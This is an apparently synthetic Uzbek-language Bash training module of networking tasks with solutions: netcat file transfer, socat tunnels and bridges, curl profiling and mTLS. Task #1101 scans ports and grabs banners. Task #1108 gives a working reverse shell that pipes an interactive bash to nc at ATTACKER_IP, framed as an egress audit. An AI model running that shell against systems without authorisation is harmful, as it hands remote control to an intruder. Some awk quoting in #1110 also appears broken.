# Khorazmiy AI: Bash & Shell - Modul 23
## Mavzu: Tarmoq protokollari va monitoring: nc/netcat, socat, curl/HTTP3, iptables/nftables, tcpdump va tarmoq avtomatizatsiyasi

Salom, men **Khorazmiy AI** loyihasining Linux tizim muhandisligi va tarmoq xavfsizligi bo'yicha bosh dataset mutaxassisiman. Ushbu modulda zamonaviy Linux infratuzilmasida tarmoq protokollarini tahlil qilish, past darajadagi soket manipulyatsiyasi (`nc`, `socat`), ilg'or HTTP/3 tahlili (`curl`), paketlarni filtrlash va xavfsizlik devorlari (`iptables`, `nftables`), chuqur paket inspektsiyasi (`tcpdump`, `tshark`) hamda to'liq avtomatlashtirilgan tarmoq boshqaruvi bo'yicha 50 ta amaliy topshiriq va ularning to'liq ishlab turgan sanoat darajasidagi Bash yechimlari taqdim etiladi.

---
### Topshiriq #1101: nc (Netcat) yordamida Tezkor Port Skanerlash va Banner Grabbing
**Tavsif:** Tizim ma'muri tashqi og'ir vositalarsiz (nmap bo'lmaganda), netcat yordamida serverdagi ochiq portlarni aniqlashi va xizmat ko'rsatayotgan dastur versiyasini (SSH, Web, SMTP banner) o'qib olishi zarur.
**Talablar:** nc -z -v -w parametrlari, portlar oralig'ini siklda aylanish, banner grabbing uchun so'rov kiritish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Netcat orqali Tezkor Port Skanerlash va Banner Grabbing
set -euo pipefail

TARGET_HOST="${1:-127.0.0.1}"
START_PORT="${2:-20}"
END_PORT="${3:-100}"
TIMEOUT_SEC=1

echo "=========================================================="
echo "[*] Nishon: ${TARGET_HOST} (${START_PORT}-${END_PORT})"
echo "[*] Skanerlash boshlandi: $(date '+%Y-%m-%d %H:%M:%S')"
echo "=========================================================="

for ((port=START_PORT; port<=END_PORT; port++)); do
    # -z: faqat ulanishni tekshirish (ma'lumot uzatmasdan)
    # -v: batafsil (verbose) chiqarish
    # -w: ulanish timeout vaqti
    if nc -z -v -w "$TIMEOUT_SEC" "$TARGET_HOST" "$port" 2>/dev/null; then
        echo -n "[+] Ochiq port topildi: ${port}/TCP"
        
        # Banner Grabbing: Servisdan dasturiy ta'minot nomini o'qishga urinish
        BANNER=$(echo "" | nc -w 2 "$TARGET_HOST" "$port" 2>/dev/null | tr -d '\r' | head -n 1 || true)
        if [[ -n "$BANNER" ]]; then
            echo " | Banner: ${BANNER}"
        else
            echo " | Banner: (Javob bermadi)"
        fi
    fi
done

echo "=========================================================="
echo "[+] Skanerlash yakunlandi."
echo "=========================================================="

```
**Tushuntirish:** `nc -z` TCP Three-Way Handshake (SYN -> SYN-ACK -> ACK) ni amalga oshirib, ulanish muvaffaqiyatli bo'lishi bilan zudlik bilan RST/FIN yuborib ulanishni yopadi. Banner grabbing esa xizmat versiyasi (masalan OpenSSH_8.9p1) orqali tizim zaifliklarini tezkor aniqlash imkonini beradi.

---

### Topshiriq #1102: nc va tar orqali Fayllar Arxivini To'g'ridan-To'g'ri Tarmoq Orqali Uzatish
**Tavsif:** SSH yoki FTP mavjud bo'lmagan favqulodda vaziyatda ikki server o'rtasida diskda oraliq .tar fayl yaratmasdan, gigabaytlab ma'lumotlarni to'g'ridan-to'g'ri xotiradan tarmoq soketiga oqizib uzating.
**Talablar:** Qabul qiluvchi tomonda nc -l, jo'natuvchi tomonda tar cf - | nc quvuri, oraliq disk joyidan foydalanmaslik.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Netcat + Tar Xotiradan Tarmoqqa Oqimli Nusxalash
set -euo pipefail

MODE="${1:-}" # 'receive' yoki 'send'
PORT="${2:-9000}"

if [[ "$MODE" == "receive" ]]; then
    DEST_DIR="${3:-/tmp/restored_data}"
    mkdir -p "$DEST_DIR"
    echo "[*] Qabul qiluvchi rejim: Port ${PORT} tinglanmoqda..."
    echo "[*] Ma'lumotlar saqlanadi: ${DEST_DIR}"
    
    # Netcat tarmoqdan olingan baytlar oqimini bevosita tar xf quvuriga beradi
    nc -l -p "$PORT" | tar -xf - -C "$DEST_DIR"
    echo "[+] Barcha fayllar muvaffaqiyatli qabul qilindi va ochildi!"

elif [[ "$MODE" == "send" ]]; then
    TARGET_IP="${3:-}"
    SOURCE_DIR="${4:-}"
    
    if [[ -z "$TARGET_IP" || -z "$SOURCE_DIR" ]]; then
        echo "Foydalanish: $0 send <port> <target_ip> <source_dir>"
        exit 1
    fi

    echo "[*] Jo'natuvchi rejim: ${SOURCE_DIR} arxivlanib ${TARGET_IP}:${PORT} ga oqizilmoqda..."
    # Diskka hech narsa yozilmaydi, xotirada arxivlanib to'g'ridan-to'g'ri soketga beriladi
    tar -cf - -C "$SOURCE_DIR" . | nc -w 5 "$TARGET_IP" "$PORT"
    echo "[+] Fayllar to'liq uzatildi!"
else
    echo "Foydalanish:"
    echo "  Server (qabul qiluvchi): $0 receive <port> <dest_dir>"
    echo "  Mijoz (jo'natuvchi):      $0 send <port> <target_ip> <source_dir>"
    exit 1
fi

```
**Tushuntirish:** Ushbu usul disk I/O operatsiyalarini ikki baravar kamaytiradi: fayllar diskka arxiv qilinmaydi, balki operatsion tizimning quvurlari (pipes) orqali xotiradan to'g'ridan-to'g'ri tarmoq interfeysi drayveriga (NIC ring buffer) uzatiladi.

---

### Topshiriq #1103: nc bilan Doimiy Aylanuvchi Minimalistik HTTP 1.1 Web Server
**Tavsif:** Konteynerlarda yoki favqulodda qutqaruv tizimlarida (rescue mode) og'ir veb serverlarsiz, faqatgina Bash va Netcat orqali HTTP GET so'rovlarini qabul qilib json formatda tizim salomatligini beruvchi mikroserver yarating.
**Talablar:** while true tsikli, FIFO nomlangan quvur (named pipe), HTTP 200 OK sarlavhalari, Content-Length hisoblash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Bash + Netcat Minimalistik HTTP Server
set -euo pipefail

PORT=8080
PIPE="/tmp/http_pipe_$$"

# Nomlangan FIFO quvurini yaratamiz
rm -f "$PIPE"
mkfifo "$PIPE"
trap 'rm -f "$PIPE"; exit 0' EXIT INT TERM

echo "[*] Bash HTTP Web Server http://0.0.0.0:${PORT} manzilida ishga tushdi..."

while true; do
    # Javobni FIFO orqali uzatamiz va nc ni tinglash rejimiga qo'yamiz
    cat "$PIPE" | nc -l -p "$PORT" | while read -r line; do
        # HTTP so'rovining birinchi qatorini o'qiymiz
        line=$(echo "$line" | tr -d '\r')
        if [[ "$line" =~ ^GET\ (.*)\ HTTP/1 ]]; then
            REQ_PATH="${BASH_REMATCH[1]}"
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] So'rov: GET ${REQ_PATH}"

            # JSON ma'lumot tayyorlaymiz
            JSON_BODY=$(cat <<EOF
{
  "status": "UP",
  "hostname": "$(hostname)",
  "load_avg": "$(cut -d' ' -f1-3 /proc/loadavg)",
  "uptime_sec": $(cut -d' ' -f1 /proc/uptime)
}
EOF
)
            BODY_LEN=$(printf "%s" "$JSON_BODY" | wc -c)

            # HTTP 1.1 javob sarlavhalarini shakllantiramiz
            cat <<EOF > "$PIPE"
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: ${BODY_LEN}
Connection: close

${JSON_BODY}
EOF
            break
        fi
    done
done

```
**Tushuntirish:** Netcat bitta ulanishdan so'ng standart holatda yopiladi. `while true` sikli va `mkfifo` nomlangan quvuri yordamida ikki tomonlama aloqa kanali hosil qilinadi, bu esa Netcat-ni doimiy qayta ishlovchi serverga aylantiradi.

---

### Topshiriq #1104: socat orqali TCP Port Yo'naltirish (Port Forwarding va Reverse Proxy)
**Tavsif:** Ichki xavfsiz tarmoqda joylashgan ma'lumotlar bazasiga (192.168.1.50:5432) tashqi mijozlar to'g'ridan-to'g'ri kira olmaganda, oraliq bastion serverda portni shaffof yo'naltiruvchi proksi o'rnating.
**Talablar:** socat TCP-LISTEN va TCP parametrlaridan foydalanish, fork opsiyasi orqali multi-client qo'llab-quvvatlash, reuseaddr.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Socat TCP Port Forwarder
set -euo pipefail

LISTEN_PORT="${1:-15432}"
TARGET_HOST="${2:-192.168.1.50}"
TARGET_PORT="${3:-5432}"

echo "=========================================================="
echo "[*] Socat Port Forwarding xizmati ishga tushirilmoqda..."
echo "[*] Kiruvchi lokal port: ${LISTEN_PORT}"
echo "[*] Nishon server:       ${TARGET_HOST}:${TARGET_PORT}"
echo "=========================================================="

# fork: Har bir yangi mijoz ulanishi uchun alohida jarayon ajratadi
# reuseaddr: Port darhol qayta ishlatilishi uchun SO_REUSEADDR ni yoqadi
exec socat -d -d \
    TCP-LISTEN:"${LISTEN_PORT}",reuseaddr,fork \
    TCP:"${TARGET_HOST}":"${TARGET_PORT}"

```
**Tushuntirish:** `socat` dasturi Netcat-ning kuchaytirilgan varianti hisoblanadi. `fork` kaliti orqali har bir yangi kiruvchi TCP soket uchun yangi subjarayon ajratiladi, bu esa bir vaqtning o'zida yuzlab parallel ma'lumotlar bazasi so'rovlarini to'xtovsiz o'tkazishni ta'minlaydi.

---

### Topshiriq #1105: socat yordamida SSL/TLS Shifrlangan TCP Tunnellash
**Tavsif:** Ochiq va xavfli umumiy tarmoqlar orqali plain-text ishlaydigan protokollarni (masalan Telnet yoki shifrlanmagan Redis) ikki server o'rtasida kuchli TLS shifrlangan tunnel orqali xavfsiz o'tkazing.
**Talablar:** openssl bilan sertifikat generatsiyasi, OPENSSL-LISTEN va OPENSSL parametrlari, cert va key bog'lash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Socat SSL/TLS Xavfsiz Tunneli
set -euo pipefail

ROLE="${1:-}" # 'server' yoki 'client'
TUNNEL_PORT="${2:-8443}"
CERT_DIR="/tmp/socat_certs"

setup_certs() {
    mkdir -p "$CERT_DIR"
    if [[ ! -f "$CERT_DIR/server.pem" ]]; then
        echo "[*] O'z-o'zini imzolagan TLS sertifikati yaratilmoqda..."
        openssl req -new -x509 -days 365 -nodes \
            -out "$CERT_DIR/server.crt" \
            -keyout "$CERT_DIR/server.key" \
            -subj "/CN=khorazmiy.secure.tunnel"
        cat "$CERT_DIR/server.key" "$CERT_DIR/server.crt" > "$CERT_DIR/server.pem"
        chmod 600 "$CERT_DIR/server.pem"
    fi
}

if [[ "$ROLE" == "server" ]]; then
    setup_certs
    LOCAL_DEST="127.0.0.1:6379" # Masalan lokal Redis
    echo "[*] TLS Server ishga tushmoqda. Port: ${TUNNEL_PORT} -> ${LOCAL_DEST}"
    exec socat OPENSSL-LISTEN:"${TUNNEL_PORT}",cert="$CERT_DIR/server.pem",verify=0,reuseaddr,fork TCP:"${LOCAL_DEST}"

elif [[ "$ROLE" == "client" ]]; then
    REMOTE_HOST="${3:-127.0.0.1}"
    LOCAL_LISTEN="16379"
    echo "[*] TLS Mijoz ochilmoqda. 127.0.0.1:${LOCAL_LISTEN} -> TLS:${REMOTE_HOST}:${TUNNEL_PORT}"
    exec socat TCP-LISTEN:"${LOCAL_LISTEN}",reuseaddr,fork OPENSSL:"${REMOTE_HOST}":"${TUNNEL_PORT}",verify=0
else
    echo "Foydalanish: $0 <server|client> [tunnel_port] [remote_host]"
    exit 1
fi

```
**Tushuntirish:** `OPENSSL-LISTEN` va `OPENSSL` manzillari orqali socat shifrlash qatlamini (TLS Session) to'liq o'z zimmasiga oladi. Dasturiy ilovalar bu tunneldan oddiy lokal TCP soket sifatida foydalanadi, lekin tarmoq bo'ylab barcha ma'lumotlar to'liq shifrlanadi.

---

### Topshiriq #1106: socat bilan Ketma-ket (Serial / TTY) Portni TCP Soketga Ko'chirish
**Tavsif:** Sanoat avtomatikasida RS-485 yoki RS-232 kontrollerlar ulangan jismoniy `/dev/ttyUSB0` ketma-ket portini tarmoqqa chiqarib, masofadan turib TCP orqali boshqarish tizimini yarating.
**Talablar:** socat da GOPEN / FILE / /dev/ttyUSB0 sozlash, baudrate (b9600, raw, echo=0), TCP-LISTEN.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Serial (RS232/485) to TCP Bridge
set -euo pipefail

SERIAL_DEV="${1:-/dev/ttyUSB0}"
BAUD_RATE="${2:-9600}"
TCP_PORT="${3:-7777}"

if [[ ! -e "$SERIAL_DEV" ]]; then
    echo "[!] Diqqat: Haqiqiy $SERIAL_DEV topilmadi. Virtual test tty juftligi yaratilmoqda..."
    # Test uchun virtual pty port yaratamiz
    socat -d -d pty,raw,echo=0,link=/tmp/virtual_serial pty,raw,echo=0,link=/tmp/virtual_client &
    sleep 1
    SERIAL_DEV="/tmp/virtual_serial"
fi

echo "[*] Ketma-ket port tarmoqqa ko'chirilmoqda..."
echo "[*] Qurilma: ${SERIAL_DEV} (${BAUD_RATE} baud)"
echo "[*] TCP Port: ${TCP_PORT}"

# raw: Ma'lumotlarni hech qanday o'zgarishsiz (CR/LF o'zgartirmay) uzatish
# echo=0: Belgilarni terminalga qaytarmaslik
exec socat -d -d \
    TCP-LISTEN:"${TCP_PORT}",reuseaddr,fork \
    FILE:"${SERIAL_DEV}",b"${BAUD_RATE}",raw,echo=0

```
**Tushuntirish:** Ushbu arxitektura Moxa kabi apparat Serial-to-Ethernet konvertorlarining dasturiy muqobilidir. Dasturlar masofadagi Linux mashinasiga TCP orqali ulanib, xuddi lokal COM portga yozayotgandek sensorlar va PLC lar bilan gaplasha oladi.

---

### Topshiriq #1107: socat yordamida UNIX Domain Socket bilan TCP O'rtasida Ko'prik
**Tavsif:** Standart holatda faqat lokal `/var/run/docker.sock` da ishlaydigan Docker demonini xavfsiz ichki tarmoqdagi boshqaruv serveriga TCP 2375 porti orqali ko'prik qilib oching.
**Talablar:** UNIX-CONNECT, TCP-LISTEN, kiruvchi manzilni faqat belgilangan xavfsiz IP bilan cheklash (bind).
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Unix Domain Socket to TCP Bridge
set -euo pipefail

UDS_PATH="${1:-/var/run/docker.sock}"
TCP_BIND_IP="127.0.0.1" # Xavfsizlik uchun faqat loopback yoki ichki IP
TCP_PORT="${2:-2375}"

if [[ ! -S "$UDS_PATH" ]]; then
    echo "[!] Ogohlantirish: Soket fayli mavjud emas: $UDS_PATH"
    echo "[!] Sinov uchun lokal dummy soket bilan ishga tushiriladi..."
fi

echo "[*] Ko'prik ishga tushirilmoqda: UNIX:${UDS_PATH} <---> TCP:${TCP_BIND_IP}:${TCP_PORT}"

exec socat -d -d \
    TCP-LISTEN:"${TCP_PORT}",bind="${TCP_BIND_IP}",reuseaddr,fork \
    UNIX-CONNECT:"${UDS_PATH}"

```
**Tushuntirish:** Ko'pgina yuqori unumdor tizimlar (PostgreSQL, Redis, Docker, FastCGI) IPC kechikishini kamaytirish uchun UDS ishlatadi. Socat ushbu lokal soketni bitta buyruq bilan tarmoq darajasiga olib chiqish imkonini beradi.

---

### Topshiriq #1108: nc orqali Reverse Shell va Xavfsizlik Auditini Tekshirish
**Tavsif:** Penetration testing va tarmoq auditi paytida xavfsizlik devori tashqi kiruvchi ulanishlarni yopib qo'yganda, ichkaridan tashqi nazorat serveriga chiquvchi TCP ulanish ochuvchi diagnostika skriptini yozing.
**Talablar:** FIFO quvuri orqali bash /bin/sh bog'lash, kiruvchi va chiquvchi oqimlarni yo'naltirish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Xavfsizlik Auditi: Reverse Shell Diagnostikasi
set -euo pipefail

ATTACKER_IP="${1:-127.0.0.1}"
ATTACKER_PORT="${2:-4444}"

echo "[*] Diagnostik ulanish tekshiruvi: ${ATTACKER_IP}:${ATTACKER_PORT}"

# Ko'pgina zamonaviy netcat larda -e bayrog'i xavfsizlik sababli o'chirilgan bo'ladi.
# Shu sababli POSIX standartidagi FIFO quvuri usulidan foydalanamiz:
FIFO_PATH="/tmp/rev_pipe_$$"
rm -f "$FIFO_PATH"
mkfifo "$FIFO_PATH"

trap 'rm -f "$FIFO_PATH"' EXIT INT TERM

echo "[*] Aloqa kanali o'rnatilmoqda..."
# FIFO dan kelgan buyruqlar /bin/bash ga beriladi, natijalar yana nc ga qaytariladi
cat "$FIFO_PATH" | /bin/bash -i 2>&1 | nc "$ATTACKER_IP" "$ATTACKER_PORT" > "$FIFO_PATH"

```
**Tushuntirish:** Reverse Shell nima uchun xavfli? Korporativ firewallar odatda kiruvchi (inbound) portlarni qattiq bloklaydi, lekin chiquvchi (outbound) portlarni (masalan 443 yoki 80) ochiq qoldiradi. Bu audit skripti tarmoq perimetrining chiquvchi filtrlash qoidalarini (egress filtering) sinash uchun zarur.

---

### Topshiriq #1109: socat bilan UDP Multicast Oqimini Broadcast Qilish va Qabul Qilish
**Tavsif:** Bir vaqtning o'zida yuzlab serverlarga bir xil birja kotirovkalarini yoki IPTV video oqimini tarmoqni ortiqcha yuklamasdan Multicast IP (239.255.0.1) orqali tarqating va qabul qiling.
**Talablar:** UDP-DATAGRAM, IP_ADD_MEMBERSHIP, UDP4-RECVFROM, sender va receiver rejimlari.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Socat UDP Multicast Tizimi
set -euo pipefail

ROLE="${1:-}" # 'sender' yoki 'receiver'
MCAST_GROUP="${2:-239.255.0.1}"
PORT="${3:-5000}"

if [[ "$ROLE" == "receiver" ]]; then
    echo "[*] Multicast Qabul qiluvchi: Guruh ${MCAST_GROUP}:${PORT} tinglanmoqda..."
    # ip-add-membership orqali tarmoq kartasini IGMP guruhiga a'zo qilamiz
    exec socat -u UDP4-RECV:"${PORT}",ip-add-membership="${MCAST_GROUP}":0.0.0.0 STDOUT

elif [[ "$ROLE" == "sender" ]]; then
    echo "[*] Multicast Tarqatuvchi: Xabarlar ${MCAST_GROUP}:${PORT} ga uzatilmoqda..."
    COUNT=1
    while true; do
        MSG="Khorazmiy AI Multicast Paket #${COUNT} | Vaqt: $(date '+%T')"
        echo "$MSG" | socat -u STDIN UDP4-DATAGRAM:"${MCAST_GROUP}":"${PORT}",ip-multicast-loop=1
        echo "[Yuborildi] $MSG"
        COUNT=$((COUNT + 1))
        sleep 1
    done
else
    echo "Foydalanish: $0 <sender|receiver> [mcast_group] [port]"
    exit 1
fi

```
**Tushuntirish:** Unicast har bir mijoz uchun alohida nusxa uzatib tarmoqni bo'g'sa, Multicast tarmoq kalitlari (switches) darajasida bitta paketni ko'paytirib faqat a'zo bo'lgan serverlarga yetkazadi. `ip-add-membership` Linux yadrosiga IGMP Join paketi chiqarishni buyuradi.

---

### Topshiriq #1110: nc va Bash yordamida Tarmoq RTT Kechikishi va Jitterini O'lchash
**Tavsif:** ICMP ping bloklangan serverlarda TCP darajasidagi haqiqiy ulanish vaqtini (Round Trip Time) va paketlar kelishidagi tebranishlarni (jitter) mikrosekundlarda hisoblab boruvchi skript yozing.
**Talablar:** date +%s%N orqali vaqtni nano-sekundlarda o'lchash, nc bilan ulanish va uzilish, o'rtacha qiymat va jitter formulasi.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - TCP RTT va Jitter Hisoblagichi
set -euo pipefail

TARGET_HOST="${1:-google.com}"
TARGET_PORT="${2:-443}"
SAMPLES="${3:-10}"

echo "=========================================================="
echo "[*] TCP Latency tahlili: ${TARGET_HOST}:${TARGET_PORT} (${SAMPLES} ta sinov)"
echo "=========================================================="

declare -a latencies=()
prev_lat=0
jitter_sum=0

for ((i=1; i<=SAMPLES; i++)); do
    START_TIME=$(date +%s%N)
    
    # TCP ulanishni tekshiramiz
    if nc -z -w 2 "$TARGET_HOST" "$TARGET_PORT" 2>/dev/null; then
        END_TIME=$(date +%s%N)
        DIFF_NS=$((END_TIME - START_TIME))
        # Millisekundga o'tkazamiz (nuqtadan keyin 2 ta belgi)
        DIFF_MS=$(awk "BEGIN {printf "%.2f", $DIFF_NS / 1000000}")
        latencies+=("$DIFF_MS")
        
        # Jitter hisoblash: |joriy - oldingi|
        if [[ $i -gt 1 ]]; then
            diff=$(awk "BEGIN {val = $DIFF_MS - $prev_lat; if (val < 0) val = -val; print val}")
            jitter_sum=$(awk "BEGIN {print $jitter_sum + $diff}")
        fi
        prev_lat="$DIFF_MS"

        echo "[Sinov #${i}] RTT: ${DIFF_MS} ms"
    else
        echo "[Sinov #${i}] Ulanish xatosi (Timeout)"
    fi
    sleep 0.2
done

# Statistik hisob-kitob
if [[ ${#latencies[@]} -gt 0 ]]; then
    AVG_RTT=$(printf "%s\n" "${latencies[@]}" | awk '{sum+=$1} END {printf "%.2f", sum/NR}')
    AVG_JITTER=$(awk "BEGIN {printf "%.2f", $jitter_sum / (${#latencies[@]} - 1)}")
    echo "----------------------------------------------------------"
    echo "[+] O'rtacha TCP RTT: ${AVG_RTT} ms"
    echo "[+] O'rtacha Jitter:   ${AVG_JITTER} ms"
    echo "=========================================================="
fi

```
**Tushuntirish:** Jitter - bu paketlar kechikishining o'zgaruvchanlik darajasidir. VoIP, onlayn savdo va video konferensiyalarda yuqori jitter uzilishlarga sabab bo'ladi. Ushbu skript ICMP taqiqlangan korporativ zonalarda TCP Handshake vaqtini sof baholash imkonini beradi.

---

### Topshiriq #1111: curl orqali HTTP So'rov Bosqichlarini (DNS, TCP, TLS, TTFB) Mikrosoniyalarda Tahlil Qilish
**Tavsif:** Veb sayt sekin ishlayotganda muammo qayerda ekanligini (DNS kechikishi, TCP ulanishi, SSL sertifikat almashinuvi yoki backend server kodi) aniq millisekundlarda ko'rsatuvchi diagnostika vositasini yarating.
**Talablar:** curl --write-out (-w) formati, time_namelookup, time_connect, time_appconnect, time_starttransfer, time_total.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Professional HTTP Performance Profiler
set -euo pipefail

URL="${1:-https://www.google.com}"

FORMAT_FILE="/tmp/curl_format_$$.txt"

cat <<'EOF' > "$FORMAT_FILE"
==========================================================
              HTTP TARMOQ BOSQICHLARI TAHLILI
==========================================================
 Nishon URL:          %{url_effective}
 HTTP Status Kodi:    %{http_code}
 IP Manzil:           %{remote_ip}:%{remote_port}
 HTTP Versiyasi:      %{http_version}
----------------------------------------------------------
 1. DNS Lookup:       %{time_namelookup} s
 2. TCP Handshake:    %{time_connect} s
 3. TLS Handshake:    %{time_appconnect} s
 4. Pre-Transfer:     %{time_pretransfer} s
 5. TTFB (Server javob kutish): %{time_starttransfer} s
----------------------------------------------------------
 JAMI VAQT:           %{time_total} s
 Yuklangan hajm:      %{size_download} bayt
 Yuklash tezligi:     %{speed_download} bayt/s
==========================================================
EOF

trap 'rm -f "$FORMAT_FILE"' EXIT INT TERM

echo "[*] Profiling amalga oshirilmoqda: ${URL}..."
curl -s -S -o /dev/null -w "@${FORMAT_FILE}" "$URL"

```
**Tushuntirish:** `time_namelookup` DNS sekinligini, `time_connect - time_namelookup` tarmoq masofasini (ping), `time_appconnect - time_connect` TLS shifrlash yukini, `time_starttransfer - time_pretransfer` (TTFB) esa backend ilovasi (PHP/Python/SQL) qanchalik sekin ishlayotganini aniq ko'rsatadi.

---

### Topshiriq #1112: curl bilan HTTP/3 (QUIC) orqali So'rov Yuborish va UDP 443 Tekshiruvi
**Tavsif:** Eng so'nggi HTTP/3 (QUIC) protokolini qo'llab-quvvatlovchi serverlarni test qilish, TCP o'rniga UDP 443 orqali paketlar almashinuvini tekshirish va javob sarlavhalarini olish skriptini yozing.
**Talablar:** curl --http3 yoki --http3-only, Alt-Svc sarlavhalarini tahlil qilish, UDP ulanish muammolarini ushlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - HTTP/3 (QUIC) Diagnostika Mijozi
set -euo pipefail

TARGET_URL="${1:-https://cloudflare-quic.com}"

echo "[*] HTTP/3 (QUIC) tekshiruvi: ${TARGET_URL}"

# Tizimdagi curl HTTP/3 ni qo'llab-quvvatlashini tekshiramiz
if ! curl -V | grep -q "HTTP3"; then
    echo "[!] Ogohlantirish: Ushbu tizimdagi curl versiyasida HTTP3 moduli yoqilmagan bo'lishi mumkin."
fi

# --http3-only: HTTP/1 yoki HTTP/2 ga qaytmasdan to'g'ridan-to'g'ri UDP QUIC ulanishga majburlash
# -I: Faqat sarlavhalarni olish
RESPONSE_HEADERS=$(curl -s -S -I --http3-only \
    -w "\n[+] Ishlatilgan Protokol: %{http_version}\n[+] Server IP: %{remote_ip}:%{remote_port}\n" \
    "$TARGET_URL" 2>&1 || true)

echo "------------------- Server Javobi -------------------"
echo "$RESPONSE_HEADERS"
echo "-----------------------------------------------------"

if echo "$RESPONSE_HEADERS" | grep -qi "HTTP/3"; then
    echo "[MUVAFFAQIN] Server HTTP/3 (QUIC) orqali javob berdi!"
else
    echo "[OGOHLANTIRISH] HTTP/3 ulanishi o'rnatilmadi. UDP 443 firewall orqali bloklangan bo'lishi mumkin."
fi

```
**Tushuntirish:** HTTP/3 TCP o'rniga UDP ustiga qurilgan QUIC protokoliga tayanadi. U 'Head-of-Line Blocking' muammosini yo'qotadi va mijoz Wi-Fi dan 4G/5G ga o'tganda ulanish uzilmasdan (Connection Migration) davom etishini ta'minlaydi.

---

### Topshiriq #1113: curl orqali mTLS (Two-Way Mutual TLS) Autentifikatsiyasi
**Tavsif:** Bank va maxfiy mikroxizmatlar infratuzilmasida faqat server emas, balki mijoz ham o'zining kriptografik sertifikati bilan shaxsini tasdiqlashi shart bo'lgan mTLS so'rovini avtomatlashtiring.
**Talablar:** curl --cert, --key, --cacert parametrlaridan foydalanish, sertifikat muddati va parolini xavfsiz boshqarish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - mTLS (Mutual TLS) Xavfsiz So'rov Skripti
set -euo pipefail

ENDPOINT_URL="${1:-https://api.banking.internal/v1/accounts}"
CLIENT_CERT="/etc/ssl/client/client.crt"
CLIENT_KEY="/etc/ssl/client/client.key"
CA_CERT="/etc/ssl/certs/corporate_ca.crt"
KEY_PASSWORD="${CLIENT_KEY_PASS:-}"

# Sertifikatlar mavjudligini tekshiramiz
for f in "$CLIENT_CERT" "$CLIENT_KEY" "$CA_CERT"; do
    if [[ ! -f "$f" ]]; then
        echo "[!] Fayl topilmadi: $f (Iltimos haqiqiy yo'lni ko'rsating)"
    fi
done

echo "[*] mTLS orqali so'rov jo'natilmoqda..."

CURL_CMD=(curl -s -S --fail-with-body \
    --cacert "$CA_CERT" \
    --cert "$CLIENT_CERT" \
    --key "$CLIENT_KEY")

if [[ -n "$KEY_PASSWORD" ]]; then
    CURL_CMD+=(--pass "$KEY_PASSWORD")
fi

CURL_CMD+=(-H "Content-Type: application/json" \
    -X POST -d '{"action": "query_balance"}' \
    "$ENDPOINT_URL")

# So'rovni bajaramiz
RESPONSE=$("${CURL_CMD[@]}")
echo "[+] Muvaffaqiyatli javob olindi:"
echo "$RESPONSE"

```
**Tushuntirish:** Mutual TLS (mTLS) nol ishonch (Zero Trust) arxitekturasining asosidir. Faqat login-parol yoki JWT emas, balki apparat yoki fayl darajasidagi X.509 shaxsiy kaliti mavjud bo'lgan mijozlargagina tarmoq paketi darajasida ulanishga ruxsat etiladi.

---

### Topshiriq #1114: curl va Bash yordamida API Rate Limit (429) Retry-After Eksponensial Kutish
**Tavsif:** Tashqi API larga katta hajmli so'rovlar yuborilganda '429 Too Many Requests' status kodi kelsa, server bergan `Retry-After` sarlavhasiga yoki eksponensial kechikishga tayanib avtomatik qayta urinuvchi chidamli skript yozing.
**Talablar:** HTTP headerlarni ajratib olish (-D), Retry-After sarlavhasini tahlil qilish, 2^attempt eksponensial backoff.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - API 429 Rate-Limit Exponential Backoff Resilient Client
set -euo pipefail

API_URL="${1:-https://api.example.com/data}"
MAX_RETRIES=5
INITIAL_BACKOFF=1

attempt=1
while [[ $attempt -le $MAX_RETRIES ]]; do
    echo "[*] [Urinish #${attempt}] So'rov yuborilmoqda: ${API_URL}"
    
    HEADERS_TMP="/tmp/curl_hdr_$$.txt"
    BODY_TMP="/tmp/curl_body_$$.txt"

    HTTP_STATUS=$(curl -s -S -D "$HEADERS_TMP" -o "$BODY_TMP" -w "%{http_code}" "$API_URL" || true)

    if [[ "$HTTP_STATUS" == "200" || "$HTTP_STATUS" == "201" ]]; then
        echo "[+] Muvaffaqiyatli yakunlandi! Status: ${HTTP_STATUS}"
        cat "$BODY_TMP"
        rm -f "$HEADERS_TMP" "$BODY_TMP"
        exit 0
    elif [[ "$HTTP_STATUS" == "429" || "$HTTP_STATUS" =~ ^50[0-9]$ ]]; then
        # Retry-After sarlavhasini qidiramiz
        RETRY_AFTER=$(grep -i '^retry-after:' "$HEADERS_TMP" | awk '{print $2}' | tr -d '\r' || true)
        
        if [[ -n "$RETRY_AFTER" && "$RETRY_AFTER" =~ ^[0-9]+$ ]]; then
            SLEEP_SEC="$RETRY_AFTER"
            echo "[!] 429 Cheklov! Server Retry-After talab qildi: ${SLEEP_SEC} soniya"
        else
            # Eksponensial orqaga chekinish (Exponential Backoff): 1, 2, 4, 8, 16 + Jitter
            SLEEP_SEC=$(( INITIAL_BACKOFF * (2 ** (attempt - 1)) ))
            echo "[!] Server xatosi (${HTTP_STATUS}). Eksponensial kutish: ${SLEEP_SEC} soniya..."
        fi
        
        sleep "$SLEEP_SEC"
        attempt=$((attempt + 1))
    else
        echo "[XATO] Qaytarilmas xatolik yuz berdi: HTTP ${HTTP_STATUS}"
        cat "$BODY_TMP"
        rm -f "$HEADERS_TMP" "$BODY_TMP"
        exit 1
    fi
    rm -f "$HEADERS_TMP" "$BODY_TMP"
done

echo "[XATO] Barcha ${MAX_RETRIES} urinishlar muvaffaqiyatsiz tugadi."
exit 1

```
